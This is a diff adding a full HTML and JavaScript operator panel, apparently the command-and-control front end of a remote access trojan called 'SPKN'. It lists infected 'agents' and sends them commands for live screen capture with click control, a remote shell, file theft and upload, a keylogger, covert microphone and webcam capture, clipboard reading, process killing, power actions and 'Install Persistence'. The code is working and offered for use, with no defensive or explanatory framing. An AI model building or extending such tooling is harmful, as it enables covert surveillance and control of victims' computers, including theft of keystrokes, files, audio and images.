@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SPKN</title>
+<style>
+:root {
+  --bg-primary: #0a0a0f;
+  --bg-secondary: #12121a;
+  --bg-tertiary: #1a1a26;
+  --bg-hover: #22222e;
+  --border: #2a2a3a;
+  --text-primary: #e0e0e8;
+  --text-secondary: #8888a0;
+  --text-muted: #555568;
+  --accent: #6c5ce7;
+  --accent-dim: #5a4bd6;
+  --green: #00d68f;
+  --red: #ff4757;
+  --orange: #ffa502;
+  --blue: #3498db;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Segoe UI', -apple-system, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* ── Login ────────────────────────────── */
+#login-screen {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  background: var(--bg-primary);
+}
+
+.login-box {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 40px;
+  width: 360px;
+  text-align: center;
+}
+
+.login-box h1 {
+  font-size: 28px;
+  font-weight: 700;
+  letter-spacing: 4px;
+  color: var(--accent);
+  margin-bottom: 8px;
+}
+
+.login-box p {
+  color: var(--text-muted);
+  font-size: 13px;
+  margin-bottom: 28px;
+}
+
+.login-box input {
+  width: 100%;
+  padding: 12px 16px;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  color: var(--text-primary);
+  font-size: 14px;
+  outline: none;
+  margin-bottom: 16px;
+}
+
+.login-box input:focus { border-color: var(--accent); }
+
+.login-box button {
+  width: 100%;
+  padding: 12px;
+  background: var(--accent);
+  border: none;
+  border-radius: 8px;
+  color: white;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.login-box button:hover { background: var(--accent-dim); }
+
+.login-error {
+  color: var(--red);
+  font-size: 13px;
+  margin-top: 12px;
+  display: none;
+}
+
+/* ── Main Layout ──────────────────────── */
+#main-screen { display: none; height: 100vh; }
+#main-screen.active { display: flex; }
+
+.sidebar {
+  width: 280px;
+  background: var(--bg-secondary);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+}
+
+.sidebar-header {
+  padding: 20px;
+  border-bottom: 1px solid var(--border);
+}
+
+.sidebar-header h2 {
+  font-size: 16px;
+  font-weight: 700;
+  letter-spacing: 3px;
+  color: var(--accent);
+}
+
+.sidebar-header .status {
+  font-size: 11px;
+  color: var(--text-muted);
+  margin-top: 4px;
+}
+
+.agent-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px;
+}
+
+.agent-card {
+  padding: 12px;
+  border-radius: 8px;
+  cursor: pointer;
+  margin-bottom: 4px;
+  transition: background 0.15s;
+  border: 1px solid transparent;
+}
+
+.agent-card:hover { background: var(--bg-hover); }
+.agent-card.selected {
+  background: var(--bg-tertiary);
+  border-color: var(--accent);
+}
+
+.agent-card .agent-name {
+  font-size: 14px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.agent-card .agent-name .dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--green);
+  flex-shrink: 0;
+}
+
+.agent-card .agent-meta {
+  font-size: 11px;
+  color: var(--text-muted);
+  margin-top: 4px;
+  padding-left: 16px;
+}
+
+.main-content {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+/* ── No Agent Selected ────────────────── */
+.no-agent {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--text-muted);
+  font-size: 14px;
+}
+
+/* ── Tabs ─────────────────────────────── */
+.tab-bar {
+  display: flex;
+  background: var(--bg-secondary);
+  border-bottom: 1px solid var(--border);
+  padding: 0 16px;
+  gap: 4px;
+  overflow-x: auto;
+}
+
+.tab-btn {
+  padding: 10px 16px;
+  font-size: 13px;
+  color: var(--text-secondary);
+  background: none;
+  border: none;
+  border-bottom: 2px solid transparent;
+  cursor: pointer;
+  white-space: nowrap;
+  transition: all 0.15s;
+}
+
+.tab-btn:hover { color: var(--text-primary); }
+.tab-btn.active {
+  color: var(--accent);
+  border-bottom-color: var(--accent);
+}
+
+/* ── Tab Content ──────────────────────── */
+.tab-content {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px;
+}
+
+.tab-pane { display: none; height: 100%; }
+.tab-pane.active { display: flex; flex-direction: column; }
+
+/* ── Screen Tab ───────────────────────── */
+.screen-controls {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 16px;
+  flex-wrap: wrap;
+}
+
+.screen-controls label {
+  font-size: 12px;
+  color: var(--text-secondary);
+}
+
+.screen-controls select,
+.screen-controls input[type="number"] {
+  padding: 6px 10px;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text-primary);
+  font-size: 12px;
+  outline: none;
+}
+
+.btn {
+  padding: 8px 16px;
+  border: none;
+  border-radius: 6px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+
+.btn-primary { background: var(--accent); color: white; }
+.btn-primary:hover { background: var(--accent-dim); }
+.btn-danger { background: var(--red); color: white; }
+.btn-success { background: var(--green); color: #000; }
+.btn-secondary { background: var(--bg-tertiary); color: var(--text-primary); border: 1px solid var(--border); }
+.btn-secondary:hover { background: var(--bg-hover); }
+.btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+.screen-viewer {
+  flex: 1;
+  background: #000;
+  border-radius: 8px;
+  overflow: hidden;
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 300px;
+}
+
+.screen-viewer img {
+  max-width: 100%;
+  max-height: 100%;
+  cursor: crosshair;
+}
+
+.screen-viewer .placeholder {
+  color: var(--text-muted);
+  font-size: 14px;
+}
+
+/* ── Shell Tab ────────────────────────── */
+.shell-output {
+  flex: 1;
+  background: #000;
+  border-radius: 8px;
+  padding: 16px;
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  font-size: 13px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  min-height: 300px;
+  color: #ccc;
+}
+
+.shell-input-row {
+  display: flex;
+  gap: 8px;
+  margin-top: 12px;
+}
+
+.shell-input-row input {
+  flex: 1;
+  padding: 10px 14px;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  color: var(--text-primary);
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  font-size: 13px;
+  outline: none;
+}
+
+.shell-input-row input:focus { border-color: var(--accent); }
+
+/* ── Files Tab ────────────────────────── */
+.file-path-bar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 16px;
+}
+
+.file-path-bar input {
+  flex: 1;
+  padding: 8px 12px;
+  background: var(--bg-tertiary);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text-primary);
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  font-size: 13px;
+  outline: none;
+}
+
+.file-list {
+  flex: 1;
+  overflow-y: auto;
+}
+
+.file-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 12px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 13px;
+  transition: background 0.1s;
+}
+
+.file-item:hover { background: var(--bg-hover); }
+.file-item .icon { font-size: 16px; }
+.file-item .name { flex: 1; }
+.file-item .size { color: var(--text-muted); font-size: 12px; }
+
+/* ── Info Tab ─────────────────────────── */
+.info-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 16px;
+}
+
+.info-card {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+}
+
+.info-card h3 {
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--text-muted);
+  margin-bottom: 8px;
+}
+
+.info-card .value {
+  font-size: 14px;
+  color: var(--text-primary);
+  word-break: break-all;
+}
+
+/* ── Processes Tab ────────────────────── */
+.process-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+}
+
+.process-table th {
+  text-align: left;
+  padding: 8px 12px;
+  color: var(--text-muted);
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  background: var(--bg-primary);
+}
+
+.process-table td {
+  padding: 6px 12px;
+  border-bottom: 1px solid var(--border);
+}
+
+.process-table tr:hover { background: var(--bg-hover); }
+
+/* ── Mic / Webcam ─────────────────────── */
+.media-section {
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+
+.media-preview {
+  background: #000;
+  border-radius: 8px;
+  min-height: 250px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  overflow: hidden;
+}
+
+.media-preview img {
+  max-width: 100%;
+  max-height: 400px;
+}
+
+/* ── Keylogger ────────────────────────── */
+.keylog-output {
+  flex: 1;
+  background: #000;
+  border-radius: 8px;
+  padding: 16px;
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  font-size: 13px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  min-height: 300px;
+  color: #0f0;
+}
+
+/* ── Scrollbar ────────────────────────── */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+
+/* ── Toast ────────────────────────────── */
+.toast {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  padding: 12px 20px;
+  border-radius: 8px;
+  font-size: 13px;
+  font-weight: 600;
+  z-index: 9999;
+  animation: slideIn 0.3s ease;
+}
+
+.toast.success { background: var(--green); color: #000; }
+.toast.error { background: var(--red); color: white; }
+
+@keyframes slideIn {
+  from { transform: translateY(20px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+</style>
+</head>
+<body>
+
+<!-- ══ Login ═══════════════════════════════════════════════════════════════ -->
+<div id="login-screen">
+  <div class="login-box">
+    <h1>SPKN</h1>
+    <p>remote administration panel</p>
+    <input type="password" id="login-pw" placeholder="password" autocomplete="off">
+    <button onclick="doLogin()">access</button>
+    <div class="login-error" id="login-error">incorrect password</div>
+  </div>
+</div>
+
+<!-- ══ Main ════════════════════════════════════════════════════════════════ -->
+<div id="main-screen">
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <h2>SPKN</h2>
+      <div class="status" id="conn-status">connecting...</div>
+    </div>
+    <div class="agent-list" id="agent-list">
+      <!-- agent cards rendered here -->
+    </div>
+  </div>
+
+  <!-- Content -->
+  <div class="main-content">
+    <div class="no-agent" id="no-agent">select an agent from the sidebar</div>
+
+    <div id="agent-panel" style="display:none; flex:1; display:flex; flex-direction:column;">
+      <!-- Tabs -->
+      <div class="tab-bar" id="tab-bar">
+        <button class="tab-btn active" data-tab="screen">Screen</button>
+        <button class="tab-btn" data-tab="shell">Shell</button>
+        <button class="tab-btn" data-tab="files">Files</button>
+        <button class="tab-btn" data-tab="keylogger">Keylogger</button>
+        <button class="tab-btn" data-tab="mic">Mic</button>
+        <button class="tab-btn" data-tab="webcam">Webcam</button>
+        <button class="tab-btn" data-tab="clipboard">Clipboard</button>
+        <button class="tab-btn" data-tab="processes">Processes</button>
+        <button class="tab-btn" data-tab="sysinfo">System</button>
+        <button class="tab-btn" data-tab="power">Power</button>
+      </div>
+
+      <!-- Tab Panes -->
+      <div class="tab-content">
+
+        <!-- SCREEN -->
+        <div class="tab-pane active" id="tab-screen">
+          <div class="screen-controls">
+            <button class="btn btn-primary" onclick="takeScreenshot()">Screenshot</button>
+            <label>Auto-refresh:
+              <select id="screen-interval" onchange="toggleAutoRefresh()">
+                <option value="0">Off</option>
+                <option value="1000">1s</option>
+                <option value="2000">2s</option>
+                <option value="5000">5s</option>
+              </select>
+            </label>
+            <label>Quality:
+              <select id="screen-quality">
+                <option value="50">Low</option>
+                <option value="70" selected>Med</option>
+                <option value="90">High</option>
+              </select>
+            </label>
+            <label style="margin-left: auto;">
+              <input type="checkbox" id="click-to-control"> Click-to-Control
+            </label>
+          </div>
+          <div class="screen-viewer" id="screen-viewer">
+            <span class="placeholder">click screenshot to start</span>
+          </div>
+        </div>
+
+        <!-- SHELL -->
+        <div class="tab-pane" id="tab-shell">
+          <div class="shell-output" id="shell-output">$ ready\n</div>
+          <div class="shell-input-row">
+            <input type="text" id="shell-input" placeholder="enter command..." autocomplete="off">
+            <button class="btn btn-primary" onclick="runShell()">Run</button>
+          </div>
+        </div>
+
+        <!-- FILES -->
+        <div class="tab-pane" id="tab-files">
+          <div class="file-path-bar">
+            <button class="btn btn-secondary" onclick="fileUp()">^</button>
+            <input type="text" id="file-path" value="C:\\" autocomplete="off">
+            <button class="btn btn-primary" onclick="fileBrowse()">Go</button>
+            <button class="btn btn-secondary" onclick="fileUpload()">Upload</button>
+          </div>
+          <div class="file-list" id="file-list"></div>
+        </div>
+
+        <!-- KEYLOGGER -->
+        <div class="tab-pane" id="tab-keylogger">
+          <div style="display:flex; gap:12px; margin-bottom:16px;">
+            <button class="btn btn-success" onclick="keylogCmd('start')">Start</button>
+            <button class="btn btn-danger" onclick="keylogCmd('stop')">Stop</button>
+            <button class="btn btn-secondary" onclick="keylogCmd('dump')">Dump</button>
+            <button class="btn btn-secondary" onclick="document.getElementById('keylog-output').textContent=''">Clear</button>
+          </div>
+          <div class="keylog-output" id="keylog-output"></div>
+        </div>
+
+        <!-- MIC -->
+        <div class="tab-pane" id="tab-mic">
+          <div class="media-section">
+            <div style="display:flex; gap:12px; align-items:center;">
+              <button class="btn btn-primary" onclick="recordMic()">Record</button>
+              <label>Duration (sec):
+                <input type="number" id="mic-duration" value="5" min="1" max="60"
+                  style="width:60px; padding:6px; background:var(--bg-tertiary); border:1px solid var(--border); border-radius:6px; color:var(--text-primary); font-size:12px;">
+              </label>
+            </div>
+            <div id="mic-recordings"></div>
+          </div>
+        </div>
+
+        <!-- WEBCAM -->
+        <div class="tab-pane" id="tab-webcam">
+          <div class="media-section">
+            <div style="display:flex; gap:12px;">
+              <button class="btn btn-primary" onclick="captureWebcam()">Capture</button>
+            </div>
+            <div class="media-preview" id="webcam-preview">
+              <span class="placeholder" style="color:var(--text-muted)">click capture to take a photo</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- CLIPBOARD -->
+        <div class="tab-pane" id="tab-clipboard">
+          <div style="display:flex; gap:12px; margin-bottom:16px;">
+            <button class="btn btn-primary" onclick="getClipboard()">Get Clipboard</button>
+            <button class="btn btn-secondary" onclick="setClipboard()">Set Clipboard</button>
+          </div>
+          <textarea id="clipboard-content" style="width:100%; flex:1; min-height:300px; padding:16px; background:#000; border:1px solid var(--border); border-radius:8px; color:var(--text-primary); font-family:'Cascadia Code',monospace; font-size:13px; resize:none; outline:none;" placeholder="clipboard content appears here..."></textarea>
+        </div>
+
+        <!-- PROCESSES -->
+        <div class="tab-pane" id="tab-processes">
+          <div style="margin-bottom:16px;">
+            <button class="btn btn-primary" onclick="getProcesses()">Refresh</button>
+          </div>
+          <div style="overflow-y:auto; flex:1;">
+            <table class="process-table">
+              <thead>
+                <tr><th>PID</th><th>Name</th><th>CPU %</th><th>Memory MB</th><th>Action</th></tr>
+              </thead>
+              <tbody id="process-list"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- SYSINFO -->
+        <div class="tab-pane" id="tab-sysinfo">
+          <div style="margin-bottom:16px;">
+            <button class="btn btn-primary" onclick="getSysinfo()">Refresh</button>
+          </div>
+          <div class="info-grid" id="sysinfo-grid"></div>
+        </div>
+
+        <!-- POWER -->
+        <div class="tab-pane" id="tab-power">
+          <div style="display:flex; flex-direction:column; gap:16px; max-width:400px;">
+            <h3 style="color:var(--text-secondary); font-size:14px;">Power Controls</h3>
+            <button class="btn btn-secondary" onclick="sendPower('lock')">Lock Screen</button>
+            <button class="btn btn-secondary" onclick="sendPower('logoff')">Log Off</button>
+            <button class="btn btn-danger" onclick="sendPower('restart')">Restart</button>
+            <button class="btn btn-danger" onclick="sendPower('shutdown')">Shutdown</button>
+            <hr style="border-color:var(--border)">
+            <h3 style="color:var(--text-secondary); font-size:14px;">Agent Controls</h3>
+            <button class="btn btn-secondary" onclick="sendAgentCmd('persist')">Install Persistence</button>
+            <button class="btn btn-danger" onclick="sendAgentCmd('uninstall')">Uninstall Agent</button>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── State ───────────────────────────────────────────────────────────────
+let token = null;
+let ws = null;
+let agents = [];
+let selectedAgent = null;
+let autoRefreshTimer = null;
+let pendingCallbacks = {};
+
+// ── Login ───────────────────────────────────────────────────────────────
+document.getElementById('login-pw').addEventListener('keydown', e => {
+  if (e.key === 'Enter') doLogin();
+});
+
+async function doLogin() {
+  const pw = document.getElementById('login-pw').value;
+  try {
+    const res = await fetch('/api/login', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({password: pw}),
+    });
+    if (!res.ok) throw new Error();
+    const data = await res.json();
+    token = data.token;
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('main-screen').classList.add('active');
+    connectPanel();
+  } catch {
+    const err = document.getElementById('login-error');
+    err.style.display = 'block';
+    setTimeout(() => err.style.display = 'none', 3000);
+  }
+}
+
+// ── WebSocket Panel Connection ──────────────────────────────────────────
+function connectPanel() {
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  ws = new WebSocket(`${proto}://${location.host}/ws/panel`);
+
+  ws.onopen = () => {
+    ws.send(JSON.stringify({token}));
+    document.getElementById('conn-status').textContent = 'connected';
+    document.getElementById('conn-status').style.color = 'var(--green)';
+  };
+
+  ws.onmessage = (evt) => {
+    const msg = JSON.parse(evt.data);
+    handleMessage(msg);
+  };
+
+  ws.onclose = () => {
+    document.getElementById('conn-status').textContent = 'disconnected — reconnecting...';
+    document.getElementById('conn-status').style.color = 'var(--red)';
+    setTimeout(connectPanel, 3000);
+  };
+
+  ws.onerror = () => ws.close();
+}
+
+function handleMessage(msg) {
+  switch (msg.type) {
+    case 'agents_list':
+      agents = msg.agents;
+      renderAgents();
+      break;
+    case 'command_response':
+      const cb = pendingCallbacks[msg.req_id];
+      if (cb) {
+        cb(msg.data);
+        delete pendingCallbacks[msg.req_id];
+      }
+      break;
+    case 'agent_data':
+      handleAgentData(msg);
+      break;
+  }
+}
+
+function handleAgentData(msg) {
+  // unsolicited keylog, etc.
+  const d = msg.data;
+  if (d.action === 'keylog_data') {
+    document.getElementById('keylog-output').textContent += d.keys || '';
+  }
+}
+
+// ── Send Command ────────────────────────────────────────────────────────
+function sendCommand(cmd, timeout = 30) {
+  return new Promise((resolve, reject) => {
+    if (!selectedAgent || !ws) return reject('no agent');
+    const reqId = crypto.randomUUID();
+    pendingCallbacks[reqId] = resolve;
+    ws.send(JSON.stringify({
+      action: 'command',
+      agent_id: selectedAgent,
+      command: cmd,
+      timeout,
+    }));
+    setTimeout(() => {
+      if (pendingCallbacks[reqId]) {
+        delete pendingCallbacks[reqId];
+        reject('timeout');
+      }
+    }, (timeout + 5) * 1000);
+  });
+}
+
+// ── Render Agents ───────────────────────────────────────────────────────
+function renderAgents() {
+  const el = document.getElementById('agent-list');
+  el.innerHTML = agents.map(a => `
+    <div class="agent-card ${selectedAgent === a.id ? 'selected' : ''}" onclick="selectAgent('${a.id}')">
+      <div class="agent-name">
+        <span class="dot" style="background:${a.connected ? 'var(--green)' : 'var(--red)'}"></span>
+        ${esc(a.info.hostname || a.id.slice(0, 8))}
+      </div>
+      <div class="agent-meta">
+        ${esc(a.info.os || '?')} &middot; ${esc(a.info.username || '?')}
+        ${a.info.ip ? ' &middot; ' + esc(a.info.ip) : ''}
+      </div>
+    </div>
+  `).join('');
+}
+
+function selectAgent(id) {
+  selectedAgent = id;
+  renderAgents();
+  document.getElementById('no-agent').style.display = 'none';
+  document.getElementById('agent-panel').style.display = 'flex';
+}
+
+function esc(s) {
+  const d = document.createElement('div');
+  d.textContent = s;
+  return d.innerHTML;
+}
+
+// ── Tabs ────────────────────────────────────────────────────────────────
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+  });
+});
+
+// ── Screen ──────────────────────────────────────────────────────────────
+async function takeScreenshot() {
+  const quality = parseInt(document.getElementById('screen-quality').value);
+  try {
+    const resp = await sendCommand({action: 'screenshot', quality});
+    if (resp.data && resp.data.image) {
+      const viewer = document.getElementById('screen-viewer');
+      viewer.innerHTML = `<img src="data:image/jpeg;base64,${resp.data.image}" onclick="handleScreenClick(event)">`;
+    }
+  } catch (e) {
+    toast('screenshot failed: ' + e, 'error');
+  }
+}
+
+function toggleAutoRefresh() {
+  if (autoRefreshTimer) {
+    clearInterval(autoRefreshTimer);
+    autoRefreshTimer = null;
+  }
+  const ms = parseInt(document.getElementById('screen-interval').value);
+  if (ms > 0) {
+    takeScreenshot();
+    autoRefreshTimer = setInterval(takeScreenshot, ms);
+  }
+}
+
+async function handleScreenClick(event) {
+  if (!document.getElementById('click-to-control').checked) return;
+  const img = event.target;
+  const rect = img.getBoundingClientRect();
+  const scaleX = img.naturalWidth / rect.width;
+  const scaleY = img.naturalHeight / rect.height;
+  const x = Math.round((event.clientX - rect.left) * scaleX);
+  const y = Math.round((event.clientY - rect.top) * scaleY);
+  try {
+    await sendCommand({action: 'mouse_click', x, y, button: event.button === 2 ? 'right' : 'left'});
+    setTimeout(takeScreenshot, 300);
+  } catch (e) {
+    toast('click failed: ' + e, 'error');
+  }
+}
+
+// ── Shell ───────────────────────────────────────────────────────────────
+document.getElementById('shell-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') runShell();
+});
+
+async function runShell() {
+  const input = document.getElementById('shell-input');
+  const output = document.getElementById('shell-output');
+  const cmd = input.value.trim();
+  if (!cmd) return;
+  input.value = '';
+  output.textContent += `\n$ ${cmd}\n`;
+  try {
+    const resp = await sendCommand({action: 'shell', command: cmd}, 60);
+    output.textContent += (resp.data?.output || '(no output)') + '\n';
+  } catch (e) {
+    output.textContent += `[error: ${e}]\n`;
+  }
+  output.scrollTop = output.scrollHeight;
+}
+
+// ── Files ───────────────────────────────────────────────────────────────
+async function fileBrowse(path) {
+  if (path) document.getElementById('file-path').value = path;
+  const dir = document.getElementById('file-path').value;
+  try {
+    const resp = await sendCommand({action: 'file_list', path: dir});
+    const items = resp.data?.items || [];
+    const el = document.getElementById('file-list');
+    el.innerHTML = items.map(f => `
+      <div class="file-item" onclick="${f.is_dir ? `fileBrowse('${esc(f.path.replace(/\\/g, '\\\\'))}')` : `fileDownload('${esc(f.path.replace(/\\/g, '\\\\'))}')`}">
+        <span class="icon">${f.is_dir ? '\uD83D\uDCC1' : '\uD83D\uDCC4'}</span>
+        <span class="name">${esc(f.name)}</span>
+        <span class="size">${f.is_dir ? '' : formatSize(f.size)}</span>
+      </div>
+    `).join('');
+  } catch (e) {
+    toast('browse failed: ' + e, 'error');
+  }
+}
+
+function fileUp() {
+  const path = document.getElementById('file-path').value;
+  const parts = path.replace(/\\/g, '/').split('/').filter(Boolean);
+  if (parts.length > 1) {
+    parts.pop();
+    fileBrowse(parts.join('\\') + '\\');
+  }
+}
+
+async function fileDownload(path) {
+  try {
+    const resp = await sendCommand({action: 'file_download', path}, 60);
+    if (resp.data?.content) {
+      const blob = new Blob([Uint8Array.from(atob(resp.data.content), c => c.charCodeAt(0))]);
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = path.split(/[/\\]/).pop();
+      a.click();
+      URL.revokeObjectURL(url);
+      toast('downloaded: ' + a.download, 'success');
+    }
+  } catch (e) {
+    toast('download failed: ' + e, 'error');
+  }
+}
+
+async function fileUpload() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.onchange = async () => {
+    const file = input.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = async () => {
+      const b64 = btoa(new Uint8Array(reader.result).reduce((s, b) => s + String.fromCharCode(b), ''));
+      const dir = document.getElementById('file-path').value;
+      const dest = dir.replace(/\\$/, '') + '\\' + file.name;
+      try {
+        await sendCommand({action: 'file_upload', path: dest, content: b64}, 60);
+        toast('uploaded: ' + file.name, 'success');
+        fileBrowse();
+      } catch (e) {
+        toast('upload failed: ' + e, 'error');
+      }
+    };
+    reader.readAsArrayBuffer(file);
+  };
+  input.click();
+}
+
+// ── Keylogger ───────────────────────────────────────────────────────────
+async function keylogCmd(action) {
+  try {
+    const resp = await sendCommand({action: 'keylog', command: action});
+    if (action === 'dump' && resp.data?.keys) {
+      document.getElementById('keylog-output').textContent += resp.data.keys;
+    }
+    toast('keylogger: ' + action, 'success');
+  } catch (e) {
+    toast('keylogger failed: ' + e, 'error');
+  }
+}
+
+// ── Mic ─────────────────────────────────────────────────────────────────
+async function recordMic() {
+  const dur = parseInt(document.getElementById('mic-duration').value) || 5;
+  toast('recording ' + dur + 's...', 'success');
+  try {
+    const resp = await sendCommand({action: 'mic_record', duration: dur}, dur + 15);
+    if (resp.data?.audio) {
+      const el = document.getElementById('mic-recordings');
+      const blob = new Blob([Uint8Array.from(atob(resp.data.audio), c => c.charCodeAt(0))], {type: 'audio/wav'});
+      const url = URL.createObjectURL(blob);
+      const ts = new Date().toLocaleTimeString();
+      el.innerHTML = `<div style="margin:8px 0; display:flex; align-items:center; gap:12px;">
+        <span style="color:var(--text-muted); font-size:12px;">${ts}</span>
+        <audio controls src="${url}" style="height:32px;"></audio>
+        <a href="${url}" download="recording_${Date.now()}.wav" class="btn btn-secondary" style="font-size:11px; padding:4px 10px;">Save</a>
+      </div>` + el.innerHTML;
+    }
+  } catch (e) {
+    toast('recording failed: ' + e, 'error');
+  }
+}
+
+// ── Webcam ──────────────────────────────────────────────────────────────
+async function captureWebcam() {
+  try {
+    const resp = await sendCommand({action: 'webcam'});
+    if (resp.data?.image) {
+      document.getElementById('webcam-preview').innerHTML = `<img src="data:image/jpeg;base64,${resp.data.image}">`;
+    }
+  } catch (e) {
+    toast('webcam failed: ' + e, 'error');
+  }
+}
+
+// ── Clipboard ───────────────────────────────────────────────────────────
+async function getClipboard() {
+  try {
+    const resp = await sendCommand({action: 'clipboard_get'});
+    document.getElementById('clipboard-content').value = resp.data?.content || '';
+  } catch (e) {
+    toast('clipboard failed: ' + e, 'error');
+  }
+}
+
+async function setClipboard() {
+  const text = document.getElementById('clipboard-content').value;
+  try {
+    await sendCommand({action: 'clipboard_set', content: text});
+    toast('clipboard set', 'success');
+  } catch (e) {
+    toast('clipboard set failed: ' + e, 'error');
+  }
+}
+
+// ── Processes ───────────────────────────────────────────────────────────
+async function getProcesses() {
+  try {
+    const resp = await sendCommand({action: 'process_list'});
+    const procs = resp.data?.processes || [];
+    document.getElementById('process-list').innerHTML = procs.map(p => `
+      <tr>
+        <td>${p.pid}</td>
+        <td>${esc(p.name)}</td>
+        <td>${p.cpu || 0}%</td>
+        <td>${(p.memory / 1024 / 1024).toFixed(1)}</td>
+        <td><button class="btn btn-danger" style="padding:2px 8px; font-size:11px;" onclick="killProcess(${p.pid})">Kill</button></td>
+      </tr>
+    `).join('');
+  } catch (e) {
+    toast('process list failed: ' + e, 'error');
+  }
+}
+
+async function killProcess(pid) {
+  try {
+    await sendCommand({action: 'kill_process', pid});
+    toast('killed ' + pid, 'success');
+    getProcesses();
+  } catch (e) {
+    toast('kill failed: ' + e, 'error');
+  }
+}
+
+// ── Sysinfo ─────────────────────────────────────────────────────────────
+async function getSysinfo() {
+  try {
+    const resp = await sendCommand({action: 'sysinfo'});
+    const info = resp.data || {};
+    const grid = document.getElementById('sysinfo-grid');
+    grid.innerHTML = Object.entries(info).map(([k, v]) => `
+      <div class="info-card">
+        <h3>${esc(k)}</h3>
+        <div class="value">${esc(String(v))}</div>
+      </div>
+    `).join('');
+  } catch (e) {
+    toast('sysinfo failed: ' + e, 'error');
+  }
+}
+
+// ── Power ───────────────────────────────────────────────────────────────
+async function sendPower(action) {
+  if (!confirm(`are you sure you want to ${action}?`)) return;
+  try {
+    await sendCommand({action: 'power', command: action});
+    toast(action + ' sent', 'success');
+  } catch (e) {
+    toast('power failed: ' + e, 'error');
+  }
+}
+
+async function sendAgentCmd(action) {
+  if (!confirm(`${action}?`)) return;
+  try {
+    await sendCommand({action});
+    toast(action + ' sent', 'success');
+  } catch (e) {
+    toast(action + ' failed: ' + e, 'error');
+  }
+}
+
+// ── Helpers ─────────────────────────────────────────────────────────────
+function formatSize(bytes) {
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+  return (bytes / 1073741824).toFixed(1) + ' GB';
+}
+
+function toast(msg, type = 'success') {
+  const el = document.createElement('div');
+  el.className = 'toast ' + type;
+  el.textContent = msg;
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), 3000);
+}
+</script>
+</body>
+</html>
